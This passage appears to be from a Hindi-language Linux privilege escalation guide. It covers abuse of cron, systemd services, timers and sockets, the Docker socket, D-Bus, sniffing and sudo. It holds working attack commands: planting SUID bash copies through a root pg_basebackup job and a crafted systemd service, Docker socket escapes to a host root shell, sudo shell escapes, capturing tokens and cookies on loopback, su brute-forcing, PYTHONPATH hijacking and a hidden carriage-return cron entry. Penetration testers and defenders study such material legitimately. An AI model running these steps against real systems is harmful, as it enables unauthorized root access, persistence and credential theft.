सफल replacement को ELF signer का इस्तेमाल करके leaked private signing material से sign किया गया था। इसके [format documentation](https://github.com/NUAA-WatchDog/linux-elf-binary-signer) में executable के `.text` से बनी signature section का वर्णन है। केवल `.text_sig` में certificate या मेल खाती string जोड़ने से अज्ञात verifier संतुष्ट होता है—ऐसा नहीं दिखाया गया है। यह निष्कर्ष निकालने से पहले कि writable signed binary का शोषण किया जा सकता है, वास्तविक scheduled path, प्रभावी write access, root invocation और verifier policy की जाँच करें। केवल `.text_sig` section होना review के लिए एक संकेत मात्र है।

### अक्सर चलने वाले cron jobs

हर 1, 2 या 5 मिनट में execute होने वाली processes खोजने के लिए आप processes को monitor कर सकते हैं। शायद आप इसका फायदा उठाकर privileges escalate कर सकें।

उदाहरण के लिए, **हर 0.1s पर 1 मिनट तक monitor करने**, **कम बार execute हुए commands को पहले sort करने** और सबसे अधिक बार execute हुए commands को हटाने के लिए, आप यह कर सकते हैं:

```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```

**आप [**pspy**](https://github.com/DominicBreuker/pspy/releases) का भी उपयोग कर सकते हैं** (यह शुरू होने वाली हर process पर नज़र रखेगा और उनकी सूची बनाएगा)।

### ऐसे root backups जो attacker द्वारा सेट किए गए mode bits को बनाए रखते हैं (pg_basebackup)

अगर root-owned cron, आपके द्वारा लिखी जा सकने वाली database directory पर `pg_basebackup` (या कोई recursive copy) चलाता है, तो आप एक **SUID/SGID binary** रख सकते हैं, जिसे backup output में वही mode bits रखते हुए **root:root** के स्वामित्व में फिर से कॉपी किया जाएगा।<sup>[[26]](#references)</sup>

एक सामान्य discovery flow (कम विशेषाधिकार वाले DB user के रूप में):
- `pspy` का उपयोग करके ऐसा root cron ढूँढ़ें जो हर मिनट `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` जैसा कुछ चलाता हो।
- पुष्टि करें कि source cluster (जैसे, `/var/lib/postgresql/14/main`) आपके लिए writable है और job चलने के बाद destination (`/opt/backups/current`) का स्वामित्व root के पास चला जाता है।

Exploit:

```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```

यह इसलिए काम करता है क्योंकि `pg_basebackup` cluster की कॉपी बनाते समय file mode bits को सुरक्षित रखता है; root द्वारा चलाए जाने पर destination files को **root ownership + attacker-chosen SUID/SGID** मिलता है। ऐसा ही कोई भी privileged backup/copy routine, जो permissions बनाए रखता है और किसी executable location में लिखता है, vulnerable है।

### अदृश्य cron jobs

एक cronjob बनाना संभव है **जिसमें comment के बाद carriage return हो** (newline character के बिना), और cron job काम करेगी। उदाहरण (carriage return char पर ध्यान दें):

```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```

इस तरह की stealth entry का पता लगाने के लिए, cron फ़ाइलों को ऐसे tools से जाँचें जो control characters दिखाते हैं:

```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```

## सेवाएँ

### लिखने योग्य _.service_ फ़ाइलें

जाँचें कि क्या आप किसी `.service` फ़ाइल में लिख सकते हैं। अगर हाँ, तो आप उसे **बदल सकते हैं**, ताकि service **शुरू**, **दोबारा शुरू** या **बंद** होने पर आपका **backdoor निष्पादित हो** (शायद आपको मशीन के रीबूट होने तक इंतज़ार करना पड़े)।\
उदाहरण के लिए, `.service` फ़ाइल के अंदर अपना backdoor इस तरह बनाएँ: **`ExecStart=/tmp/script.sh`**

### लिखने योग्य service binaries

ध्यान रखें कि अगर आपके पास services द्वारा निष्पादित की जा रही binaries पर **लिखने की अनुमति** है, तो आप उन्हें backdoor से बदल सकते हैं, ताकि services के दोबारा निष्पादित होने पर backdoor चलें।

### systemd PATH - सापेक्ष पथ

आप यहाँ **systemd** द्वारा उपयोग किया जाने वाला PATH देख सकते हैं:

```bash
systemctl show-environment
```

यदि आप path के किसी भी folder में **लिख** सकते हैं, तो आप **escalate privileges** कर सकते हैं। आपको service configuration files में उपयोग किए जा रहे **relative paths** खोजने होंगे, जैसे:

```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```

फिर, जिस systemd PATH फ़ोल्डर में आप लिख सकते हैं, उसके अंदर relative path binary के **उसी नाम से** एक **executable** बनाएँ। जब service से vulnerable action (**Start**, **Stop**, **Reload**) execute करने को कहा जाएगा, तो आपका **backdoor execute होगा** (आमतौर पर unprivileged users services को start/stop नहीं कर सकते, लेकिन जाँचें कि क्या आप `sudo -l` का इस्तेमाल कर सकते हैं)।

**services के बारे में `man systemd.service` से और जानें।**

## **Timers**

**Timers** systemd unit files हैं जिनके नाम का अंत `**.timer**` से होता है। ये `**.service**` files या events को नियंत्रित करते हैं। **Timers** का इस्तेमाल cron के विकल्प के रूप में किया जा सकता है, क्योंकि इनमें calendar time events और monotonic time events के लिए built-in support होता है और इन्हें asynchronous रूप से चलाया जा सकता है।

आप सभी timers की सूची इस तरह देख सकते हैं:

```bash
systemctl list-timers --all
```

### Writable timers

अगर आप किसी timer को modify कर सकते हैं, तो उससे systemd.unit की कुछ मौजूदा इकाइयाँ (जैसे `.service` या `.target`) execute करवा सकते हैं।

```bash
Unit=backdoor.service
```

दस्तावेज़ में आप पढ़ सकते हैं कि Unit क्या है:

> इस timer के समाप्त होने पर सक्रिय किया जाने वाला unit। इसका argument एक unit name है, जिसका suffix ".timer" नहीं होता। अगर निर्दिष्ट न किया जाए, तो यह मान timer unit के समान नाम वाले service पर सेट होता है, suffix को छोड़कर। (ऊपर देखें।) यह अनुशंसा की जाती है कि सक्रिय किए जाने वाले unit name और timer unit के नाम समान हों, केवल suffix अलग हो।

इसलिए, इस permission का दुरुपयोग करने के लिए आपको:

- ऐसा systemd unit (जैसे `.service`) ढूँढ़ना होगा जो **किसी writable binary को चला रहा हो**
- ऐसा systemd unit ढूँढ़ना होगा जो **relative path चला रहा हो**, और आपके पास **systemd PATH** पर **writable privileges** हों (ताकि उस executable का प्रतिरूपण कर सकें)

**`man systemd.timer` के साथ timers के बारे में और जानें।**

### **Timer सक्षम करना**

किसी timer को सक्षम करने के लिए आपको root privileges और यह चलाना होगा:

```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```

ध्यान दें कि `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer` पर symlink बनाकर **timer** को **activate** किया जाता है।

## Sockets

Unix Domain Sockets (UDS), client-server models में एक ही या अलग-अलग machines पर **process communication** सक्षम करते हैं। ये computers के बीच communication के लिए standard Unix descriptor files का उपयोग करते हैं और इन्हें `.socket` files के ज़रिए set up किया जाता है।<sup>[[14]](#references)</sup>

Sockets को `.socket` files का उपयोग करके configure किया जा सकता है।

**`man systemd.socket` से sockets के बारे में और जानें।** इस file में कई दिलचस्प parameters configure किए जा सकते हैं:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: ये options अलग-अलग हैं, लेकिन इनका सार यह **बताता है कि socket कहाँ listen करेगा** (AF_UNIX socket file का path, सुनने के लिए IPv4/6 और/या port number आदि)
- `Accept`: Boolean argument लेता है। अगर **true** हो, तो हर incoming connection के लिए एक **service instance शुरू किया जाता है** और उसे केवल connection socket दिया जाता है। अगर **false** हो, तो सभी listening sockets स्वयं **शुरू की गई service unit को दिए जाते हैं**, और सभी connections के लिए केवल एक service unit शुरू की जाती है। Datagram sockets और FIFOs के लिए इस value को अनदेखा किया जाता है, जहाँ एक ही service unit बिना किसी शर्त के आने वाले सभी traffic को handle करती है। **Default false है**। Performance के कारणों से, नई daemons को केवल `Accept=no` के अनुकूल तरीके से लिखने की सलाह दी जाती है।
- `ExecStartPre`, `ExecStartPost`: एक या अधिक command lines लेते हैं, जिन्हें listening **sockets**/FIFOs के **बनने** और bind होने से पहले या बाद में क्रमशः **execute किया जाता है**। Command line का पहला token एक absolute filename होना चाहिए, जिसके बाद process के arguments हों।
- `ExecStopPre`, `ExecStopPost`: अतिरिक्त **commands**, जिन्हें listening **sockets**/FIFOs के **बंद** होने और हटाए जाने से पहले या बाद में क्रमशः **execute किया जाता है**।
- `Service`: incoming traffic पर **activate करने के लिए** `service` unit का नाम निर्दिष्ट करता है। यह setting केवल `Accept=no` वाले sockets के लिए अनुमत है। Default रूप से यह socket के समान नाम वाली service होती है (suffix बदलकर)। अधिकांश मामलों में, इस option का उपयोग करना आवश्यक नहीं होना चाहिए।

### लिखने योग्य .socket files

अगर आपको कोई **लिखने योग्य** `.socket` file मिले, तो `[Socket]` section की शुरुआत में कुछ ऐसा **जोड़** सकते हैं: `ExecStartPre=/home/kali/sys/backdoor` और socket बनने से पहले backdoor execute होगा। इसलिए, आपको **शायद machine के reboot होने तक इंतज़ार करना होगा।**\
_ध्यान दें कि system में इस socket file configuration का उपयोग होना चाहिए, वरना backdoor execute नहीं होगा_

### Socket activation + लिखने योग्य unit path (missing service बनाना)

एक और गंभीर misconfiguration यह है:

- `Accept=no` और `Service=<name>.service` वाली socket unit
- संदर्भित service unit मौजूद नहीं है
- attacker `/etc/systemd/system` (या किसी अन्य unit search path) में लिख सकता है

ऐसी स्थिति में, attacker `<name>.service` बना सकता है, फिर socket पर traffic भेज सकता है, ताकि systemd नई service को root के रूप में load और execute करे।

संक्षिप्त क्रम:

```bash
systemctl cat vuln.socket
# [Socket]
# Accept=no
# Service=vuln.service
```

```bash
cat >/etc/systemd/system/vuln.service <<'EOF'
[Service]
Type=oneshot
ExecStart=/bin/bash -c 'cp /bin/bash /var/tmp/rootbash && chmod 4755 /var/tmp/rootbash'
EOF
nc -q0 127.0.0.1 9999
/var/tmp/rootbash -p
```

### लिखने योग्य sockets

अगर आप **किसी भी लिखने योग्य socket की पहचान करते हैं** (_यहाँ हम Unix Sockets की बात कर रहे हैं, config `.socket` files की नहीं_), तो **आप उस socket से communicate कर सकते हैं** और शायद किसी vulnerability का exploit कर सकते हैं।

### Unix Sockets की enumeration

```bash
netstat -a -p --unix
```

### रॉ कनेक्शन

```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```

**Exploitation example:**


{{#ref}}
../../network-information/socket-command-injection.md
{{#endref}}

### HTTP sockets

ध्यान दें कि HTTP requests सुनने वाले कुछ **sockets** हो सकते हैं (_मेरा मतलब .socket files से नहीं है, बल्कि उन files से है जो unix sockets की तरह काम करती हैं_)। आप इसे इस तरह जाँच सकते हैं:

```bash
curl --max-time 2 --unix-socket /path/to/socket/file http://localhost/
```

यदि socket किसी **HTTP** request का जवाब देता है, तो आप उससे **communicate** कर सकते हैं और शायद **किसी vulnerability का exploit** कर सकते हैं।

### Writable Docker Socket

Docker socket, जो अक्सर `/var/run/docker.sock` पर मिलता है, एक महत्वपूर्ण file है जिसे सुरक्षित रखा जाना चाहिए। डिफ़ॉल्ट रूप से, इस पर `root` user और `docker` group के सदस्यों को write access होता है। इस socket पर write access होने से privilege escalation हो सकता है। इसे कैसे किया जा सकता है और Docker CLI उपलब्ध न होने पर कौन-से वैकल्पिक तरीके अपनाए जा सकते हैं, इसका विवरण नीचे दिया गया है।

#### **Docker CLI से Privilege Escalation**

यदि आपके पास Docker socket पर write access है, तो आप निम्नलिखित commands का उपयोग करके privileges बढ़ा सकते हैं:<sup>[[15]](#references)</sup>

```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```

ये commands आपको host के file system पर root-level access के साथ container चलाने की अनुमति देते हैं।

#### **Docker API का सीधे उपयोग**

ऐसी स्थिति में, जब Docker CLI उपलब्ध न हो, तब भी Unix socket पर raw HTTP का उपयोग करके Docker socket का दुरुपयोग किया जा सकता है। सबसे विश्वसनीय तरीका है:

- host root को bind-mount करके एक लंबे समय तक चलने वाला helper container बनाएँ
- उसे शुरू करें
- उस helper के भीतर एक `exec` instance बनाएँ
- `exec` instance शुरू करें और API के ज़रिए उसका output वापस पढ़ें

**Docker images की सूची बनाएँ**

```bash
curl --unix-socket /var/run/docker.sock http://localhost/images/json
```

**एक सहायक container बनाएँ और शुरू करें**

```bash
HELPER=helper

curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"alpine:3.20","Cmd":["sleep","99999"],"HostConfig":{"Binds":["/:/host"]}}' \
  "http://localhost/v1.47/containers/create?name=${HELPER}"

curl --unix-socket /var/run/docker.sock \
  -X POST "http://localhost/v1.47/containers/${HELPER}/start"
```

**एक exec instance बनाएं**

```bash
EXEC_ID=$(
  curl -s --unix-socket /var/run/docker.sock \
    -H "Content-Type: application/json" \
    -d '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["sh","-lc","find /host/root -maxdepth 1 -type f"]}' \
    "http://localhost/v1.47/containers/${HELPER}/exec" \
  | tr -d '\n' \
  | sed -n 's/.*"Id":"\([^"]*\)".*/\1/p'
)
```

**exec instance शुरू करें और output पढ़ें**

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":true}' \
  "http://localhost/v1.47/exec/${EXEC_ID}/start"
```

यह pattern आमतौर पर `socat` या `nc -U` से मैन्युअल रूप से `attach` चलाने की कोशिश करने से ज़्यादा robust होता है। एक बार `/:/host` के साथ helper बना लेने पर, आप `/host/root/...` जैसी files पढ़ने, `/host/root/.ssh` में SSH keys जोड़ने या host startup files में बदलाव करने के लिए अतिरिक्त `exec` instances का उपयोग कर सकते हैं।

### अन्य

ध्यान दें कि अगर आपके पास **`docker` group के अंदर होने के कारण** docker socket पर write permissions हैं, तो आपके पास [**privileges escalate करने के और तरीके**](../../user-information/interesting-groups-linux-pe/index.html#docker-group) हैं। अगर [**docker API किसी port पर listen कर रही है**, तो आप उससे compromise भी कर सकते हैं](../../../network-services-pentesting/2375-pentesting-docker.md#compromising)।

**Containers से बाहर निकलने या privileges escalate करने के लिए container runtimes का दुरुपयोग करने के और तरीके** यहाँ देखें:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Containerd (ctr) privileges escalation

अगर आपको पता चलता है कि आप **`ctr`** command का उपयोग कर सकते हैं, तो अगला page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/containerd-ctr-privilege-escalation.md
{{#endref}}

## **RunC** privileges escalation

अगर आपको पता चलता है कि आप **`runc`** command का उपयोग कर सकते हैं, तो अगला page पढ़ें, क्योंकि **आप privileges escalate करने के लिए इसका दुरुपयोग कर सकते हैं**:


{{#ref}}
../../containers-namespaces/runc-privilege-escalation.md
{{#endref}}

## **D-Bus**

D-Bus एक उन्नत **inter-Process Communication (IPC) system** है, जो applications को प्रभावी ढंग से एक-दूसरे के साथ काम करने और data साझा करने में सक्षम बनाता है। आधुनिक Linux system को ध्यान में रखकर बनाया गया यह system, applications के बीच विभिन्न प्रकार के communication के लिए एक मजबूत framework प्रदान करता है।<sup>[[16]](#references)</sup>

यह system बहुउपयोगी है और इसमें basic IPC शामिल है, जो processes के बीच data exchange को बेहतर बनाता है और **enhanced UNIX domain sockets** जैसा है। इसके अलावा, यह events या signals broadcast करने में मदद करता है, जिससे system components के बीच सहज integration संभव होता है। उदाहरण के लिए, incoming call के बारे में Bluetooth daemon से मिला signal music player को mute कर सकता है, जिससे user experience बेहतर होता है। D-Bus remote object system को भी support करता है, जो applications के बीच service requests और method invocations को सरल बनाता है और उन प्रक्रियाओं को सुव्यवस्थित करता है जो पहले जटिल थीं।

D-Bus **allow/deny model** पर काम करता है और matching policy rules के कुल प्रभाव के आधार पर message permissions (method calls, signal emissions आदि) प्रबंधित करता है। ये policies bus के साथ होने वाले interactions को निर्दिष्ट करती हैं और इन permissions का दुरुपयोग करके privilege escalation संभव हो सकता है।

ऐसी policy का एक उदाहरण `/etc/dbus-1/system.d/wpa_supplicant.conf` में दिया गया है। इसमें root user को `fi.w1.wpa_supplicant1` का owner बनने तथा उसे messages भेजने और उससे messages प्राप्त करने की permissions दी गई हैं।

बिना किसी user या group को निर्दिष्ट करने वाली policies सभी पर लागू होती हैं, जबकि "default" context policies उन सभी पर लागू होती हैं जिन्हें अन्य विशिष्ट policies में शामिल नहीं किया गया है।

```xml
<policy user="root">
    <allow own="fi.w1.wpa_supplicant1"/>
    <allow send_destination="fi.w1.wpa_supplicant1"/>
    <allow send_interface="fi.w1.wpa_supplicant1"/>
    <allow receive_sender="fi.w1.wpa_supplicant1" receive_type="signal"/>
</policy>
```

**D-Bus communication को enumerate और exploit करना यहाँ सीखें:**


{{#ref}}
../../processes-crontab-systemd-dbus/d-bus-enumeration-and-command-injection-privilege-escalation.md
{{#endref}}

## **नेटवर्क**

नेटवर्क को enumerate करना और मशीन की स्थिति का पता लगाना हमेशा दिलचस्प होता है।

### सामान्य enumeration

```bash
#Hostname, hosts and DNS
cat /etc/hostname /etc/hosts /etc/resolv.conf
dnsdomainname

#NSS resolution order (hosts file vs DNS)
grep -E '^(hosts|networks):' /etc/nsswitch.conf
getent hosts localhost

#Content of /etc/inetd.conf & /etc/xinetd.conf
cat /etc/inetd.conf /etc/xinetd.conf

#Interfaces
cat /etc/networks
(ifconfig || ip a)
(ip -br addr || ip addr show)

#Routes and policy routing (pivot paths)
ip route
ip -6 route
ip rule
ip route get 1.1.1.1

#L2 neighbours
(arp -e || arp -a || ip neigh)

#Neighbours
(arp -e || arp -a)
(route || ip n)

#L2 topology (VLANs/bridges/bonds)
ip -d link
bridge link 2>/dev/null

#Network namespaces (hidden interfaces/routes in containers)
ip netns list 2>/dev/null
ls /var/run/netns/ 2>/dev/null
nsenter --net=/proc/1/ns/net ip a 2>/dev/null

#Iptables rules
(timeout 1 iptables -L 2>/dev/null; cat /etc/iptables/* | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null)

#nftables and firewall wrappers (modern hosts)
sudo nft list ruleset 2>/dev/null
sudo nft list ruleset -a 2>/dev/null
sudo ufw status verbose 2>/dev/null
sudo firewall-cmd --state 2>/dev/null
sudo firewall-cmd --list-all 2>/dev/null

#Forwarding / asymmetric routing / conntrack state
sysctl net.ipv4.ip_forward net.ipv6.conf.all.forwarding net.ipv4.conf.all.rp_filter 2>/dev/null
sudo conntrack -L 2>/dev/null | head -n 20

#Files used by network services
lsof -i
```

यदि कोई सक्रिय `/etc/inetd.conf` एंट्री GNU Inetutils `telnetd` को root के रूप में चलाती है, तो कॉन्फ़िगर किए गए binary version और local listener की जाँच करें, भले ही port केवल loopback पर bind हो। GNU Inetutils 1.9.3 से 2.7 तक में [telnet authentication bypass](https://seclists.org/oss-sec/2026/q1/89) था, जिसमें client द्वारा दिया गया `USER`, `login -f` तक पहुँचता था (CVE-2026-24061)। कोई process या version string एक संकेत है; इसे exposed मानने से पहले vendor patch status और वास्तविक daemon की पुष्टि करें। [Telnet guide](../../../network-services-pentesting/pentesting-telnet.md) में अधिक जानकारी है।

### आउटबाउंड फ़िल्टरिंग की त्वरित जाँच

यदि host commands चला सकता है, लेकिन callbacks विफल होते हैं, तो DNS, transport, proxy और route filtering को जल्दी अलग-अलग जाँचें:

```bash
# DNS over UDP and TCP (TCP fallback often survives UDP/53 filters)
dig +time=2 +tries=1 @1.1.1.1 google.com A
dig +tcp +time=2 +tries=1 @1.1.1.1 google.com A

# Common outbound ports
for p in 22 25 53 80 443 587 8080 8443; do nc -vz -w3 example.org "$p"; done

# Route/path clue for 443 filtering
sudo traceroute -T -p 443 example.org 2>/dev/null || true

# Proxy-enforced environments and remote-DNS SOCKS testing
env | grep -iE '^(http|https|ftp|all)_proxy|no_proxy'
curl --socks5-hostname <ip>:1080 https://ifconfig.me
```

### खुले ports

मशीन को access करने से पहले, उस पर चल रही उन network services को हमेशा जांचें जिनसे आप पहले interact नहीं कर पाए थे:

```bash
(netstat -punta || ss --ntpu)
(netstat -punta || ss --ntpu) | grep "127.0"
ss -tulpn
#Quick view of local bind addresses (great for hidden/isolated interfaces)
ss -tulpn | awk '{print $5}' | sort -u
```

Bind target के अनुसार listeners को वर्गीकृत करें:

- `0.0.0.0` / `[::]`: सभी स्थानीय interfaces पर exposed।
- `127.0.0.1` / `::1`: केवल local (tunnel/forward के लिए अच्छे candidates)।
- विशिष्ट internal IPs (जैसे `10.x`, `172.16/12`, `192.168.x`, `fe80::`): आमतौर पर केवल internal segments से reachable।

### केवल-local service triage workflow

जब आप किसी host को compromise करते हैं, तो `127.0.0.1` पर bound services अक्सर पहली बार आपके shell से reachable हो जाती हैं। एक त्वरित local workflow यह है:

```bash
# 1) Find local listeners
ss -tulnp

# 2) Discover open localhost TCP ports
nmap -Pn --open -p- 127.0.0.1

# 3) Fingerprint only discovered ports
nmap -Pn -sV -p <ports> 127.0.0.1

# 4) Manually interact / banner grab
nc 127.0.0.1 <port>
printf 'HELP\r\n' | nc 127.0.0.1 <port>
```

### नेटवर्क स्कैनर के रूप में LinPEAS (केवल नेटवर्क मोड)

स्थानीय PE जांचों के अलावा, linPEAS एक केंद्रित नेटवर्क स्कैनर के रूप में चल सकता है। यह `$PATH` में उपलब्ध बाइनरी (आमतौर पर `fping`, `ping`, `nc`, `ncat`) का उपयोग करता है और कोई टूल इंस्टॉल नहीं करता।

```bash
# Auto-discover subnets + hosts + quick ports
./linpeas.sh -t

# Host discovery in CIDR
./linpeas.sh -d 10.10.10.0/24

# Host discovery + custom ports
./linpeas.sh -d 10.10.10.0/24 -p 22,80,443

# Scan one IP (default/common ports)
./linpeas.sh -i 10.10.10.20

# Scan one IP with selected ports
./linpeas.sh -i 10.10.10.20 -p 21,22,80,443
```

यदि आप `-t` के बिना `-d`, `-p`, या `-i` पास करते हैं, तो linPEAS एक शुद्ध network scanner की तरह काम करता है (privilege-escalation की बाकी जाँचें छोड़कर)।

### Sniffing

जाँचें कि क्या आप traffic sniff कर सकते हैं। अगर कर सकते हैं, तो आप कुछ credentials हासिल कर सकते हैं।

```
timeout 1 tcpdump
```

त्वरित व्यावहारिक जाँच:

```bash
#Can I capture without full sudo?
which dumpcap && getcap "$(which dumpcap)"

#Find capture interfaces
tcpdump -D
ip -br addr
```

Loopback (`lo`) post-exploitation में खास तौर पर उपयोगी है, क्योंकि कई केवल-आंतरिक सेवाएँ वहाँ tokens/cookies/credentials expose करती हैं:

```bash
sudo tcpdump -i lo -s 0 -A -n 'tcp port 80 or 8000 or 8080' \
  | egrep -i 'authorization:|cookie:|set-cookie:|x-api-key|bearer|token|csrf'
```

अभी कैप्चर करें, बाद में पार्स करें:

```bash
sudo tcpdump -i any -s 0 -n -w /tmp/capture.pcap
tshark -r /tmp/capture.pcap -Y http.request \
  -T fields -e frame.time -e ip.src -e http.host -e http.request.uri
```

## उपयोगकर्ता

### सामान्य Enumeration

जाँचें कि आप **कौन** हैं, आपके पास कौन-से **privileges** हैं, सिस्टम में कौन-से **users** हैं, कौन **login** कर सकते हैं और किनके पास **root privileges** हैं:

```bash
#Info about me
id || (whoami && groups) 2>/dev/null
#List all users
cat /etc/passwd | cut -d: -f1
#List users with console
cat /etc/passwd | grep "sh$"
#List superusers
awk -F: '($3 == "0") {print}' /etc/passwd
#Currently logged users
who
w
#Only usernames
users
#Login history
last | tail
#Last log of each user
lastlog2 2>/dev/null || lastlog

#List all users and their groups
for i in $(cut -d":" -f1 /etc/passwd 2>/dev/null);do id $i;done 2>/dev/null | sort
#Current user PGP keys
gpg --list-keys 2>/dev/null
```

### बड़ा UID

Linux के कुछ versions एक bug से प्रभावित थे, जो **UID > INT_MAX** वाले users को privileges escalate करने की अनुमति देता है। अधिक जानकारी: [यहाँ](https://gitlab.freedesktop.org/polkit/polkit/issues/74), [यहाँ](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh) और [यहाँ](https://twitter.com/paragonsec/status/1071152249529884674)।<sup>[[33]](#references)[[34]](#references)[[35]](#references)</sup>\
**इसे Exploit करें**: **`systemd-run -t /bin/bash`**

### समूह

जाँचें कि क्या आप **किसी ऐसे group के सदस्य हैं** जो आपको root privileges दे सकता है:


{{#ref}}
../../user-information/interesting-groups-linux-pe/
{{#endref}}

### क्लिपबोर्ड

जाँचें कि क्या क्लिपबोर्ड में कुछ दिलचस्प मौजूद है (यदि संभव हो)

```bash
if [ `which xclip 2>/dev/null` ]; then
    echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
    echo "Highlighted text: "`xclip -o 2>/dev/null`
  elif [ `which xsel 2>/dev/null` ]; then
    echo "Clipboard: "`xsel -ob 2>/dev/null`
    echo "Highlighted text: "`xsel -o 2>/dev/null`
  else echo "Not found xsel and xclip"
  fi
```

### पासवर्ड नीति

```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```

### ज्ञात पासवर्ड

यदि आपको environment का **कोई भी password पता है**, तो उस password का उपयोग करके **हर user के रूप में login करने की कोशिश करें**।

### Su Brute

यदि आपको बहुत अधिक शोर करने से कोई समस्या नहीं है और कंप्यूटर पर `su` तथा `timeout` binaries मौजूद हैं, तो [su-bruteforce](https://github.com/carlospolop/su-bruteforce) का उपयोग करके user को brute-force करने की कोशिश कर सकते हैं।\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) `-a` parameter के साथ users को brute-force करने की कोशिश भी करता है।

## Writable PATH का दुरुपयोग

### $PATH

यदि आपको पता चलता है कि आप **$PATH के किसी folder में लिख सकते हैं**, तो writable folder के अंदर backdoor बनाकर privileges escalate कर सकते हैं। उस backdoor का नाम ऐसे command के नाम पर रखें, जिसे कोई दूसरा user (आदर्श रूप से root) execute करने वाला हो और जो **$PATH में आपके writable folder से पहले मौजूद किसी folder से load न होता हो**।

### SUDO और SUID

आपको sudo का उपयोग करके कोई command execute करने की अनुमति हो सकती है या उसमें suid bit हो सकती है। इसे इस तरह जाँचें:

```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```

कुछ **अप्रत्याशित commands आपको फ़ाइलें पढ़ने और/या लिखने, या यहाँ तक कि कोई command चलाने की अनुमति देते हैं**।<sup>[[8]](#references)</sup> उदाहरण के लिए:

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```

### NOPASSWD

Sudo configuration किसी user को password जाने बिना, दूसरे user के privileges के साथ कुछ commands execute करने की अनुमति दे सकता है।

```
$ sudo -l
User demo may run the following commands on crashlab:
    (root) NOPASSWD: /usr/bin/vim
```

इस उदाहरण में उपयोगकर्ता demo, vim को root के रूप में चला सकता है। अब root directory में ssh key जोड़कर या sh चलाकर shell प्राप्त करना बेहद आसान है।

```
sudo vim -c '!sh'
```

### sudo script में Unquoted Bash comparison

Bash में, `[[ "$protected" == $candidate ]]` का दायाँ पक्ष एक pattern होता है। अगर root-capable sudo script, `candidate` को caller-controlled file से भरती है, तो `prefix*` जैसी value किसी protected string की शुरुआत से match कर सकती है। अलग-अलग success और error paths तब prefix oracle उजागर कर सकते हैं। Literal equality का इरादा होने पर दाएँ पक्ष को quote करें (`[[ "$protected" == "$candidate" ]]`)। किसी unquoted comparison को exploitable मानने से पहले वास्तविक sudo arguments, input provenance और observable branch behavior की समीक्षा करें। [GNU Bash manual](https://www.gnu.org/software/bash/manual/html_node/Conditional-Constructs.html) इस pattern behavior को परिभाषित करता है।

### sudo के तहत PrusaSlicer project files

अगर caller वह `.3mf` project चुन सकता है जिसे slice किया जाएगा, तो `prusaslicer` या `prusa-slicer` के लिए unrestricted root-capable sudo grant की समीक्षा करना उचित है। किसी project में post-processing script हो सकती है, जो G-code export होने पर चलती है; crafted projects, 2.6.1 तक PrusaSlicer में commands execute कर सकते हैं ([CVE-2023-47268](https://security-tracker.debian.org/tracker/CVE-2023-47268))। Privilege boundary तक पहुँचना संभव है या नहीं, यह तय करने से पहले प्रभावी sudo rule, binary version और vendor patches, project source, और यह पुष्टि करें कि संबंधित export path चलता है या नहीं। Fixed project argument या प्रभावी `NOEXEC` policy नतीजे को बदल सकती है। केवल slicer installed होने से privilege escalation path साबित नहीं होता।

### SETENV

यह directive उपयोगकर्ता को कुछ execute करते समय **environment variable set करने** की अनुमति देता है:

```bash
$ sudo -l
User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

यह उदाहरण, **HTB मशीन Admirer पर आधारित**, root के रूप में script चलाते समय मनमानी Python library लोड करने के लिए **PYTHONPATH hijacking** के प्रति **असुरक्षित** था:

```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```

### sudo-allowed Python imports में writable `__pycache__` / `.pyc` poisoning

